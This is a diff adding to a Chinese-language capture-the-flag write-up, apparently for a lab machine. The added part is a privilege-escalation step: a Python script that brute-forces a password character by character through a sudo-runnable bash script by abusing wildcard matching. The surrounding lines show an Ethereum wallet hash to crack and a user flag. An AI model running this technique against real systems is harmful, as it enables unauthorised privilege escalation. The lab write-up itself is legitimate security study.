@@ -104,6 +104,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ## 提权
 
+![picture 30](../assets/images/5b748cea3702958220fea7d27150254a858ce0853d73fca78e85c198d682dc83.png)  
+
+>查了图片以为私钥在里面看来不是，只能解密这个secret
+>
 
 >来自ll104567大佬提供的爆破形式和提示，主要我查了gtp压根没见着这个形式所以爆破失败
 >
@@ -130,6 +134,46 @@ secret2:$ethereum$s*262144*8*1*abb71ccb91d0ec97831d49694bd80ce925c0204772fa6268a
 >
 
 ![picture 7](../assets/images/cff77a148b755df0ba5fc278455702744290c2e482d51c797bc2a95a08642157.png)  
+
+>补充一下预期解不是王炸，需要做的是密码爆破，我之前写过一个脚步忘了放那了现在重新写一份留出来
+>
+
+```
+import subprocess
+
+all_num = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+prefix = ""
+
+def check_password(passwd):
+    
+    try:
+        result = subprocess.run(["sudo", "/bin/bash", "/home/ll104567/guessme"], input=passwd, text=True, capture_output=True)
+        return result.returncode == 0
+
+    except Exception as e:
+        print(f"error: {e}")
+        return False
+    
+while True:
+    found = False
+    for char in all_num:
+        attempt = prefix + char
+        print(f"\rTrying: {attempt}*",end="")
+
+        if check_password(attempt + "*"):
+            prefix += char
+            found = True
+            break
+```
+
+>当他不在输出时前一个就是爆破出的密码
+>
+
+![picture 31](../assets/images/483262f675dbd49f3ad13ba14634b5f9d2df3c306db5382c2952076d9d1f533b.png)  
+
+>他不会自动停止脚步，需要手动停但是你能完整看到密码，改进的话再议
+>
 
 
 >userflag:yLFsSkfsLjQQKm49HCkwBtiY60ESXH3s
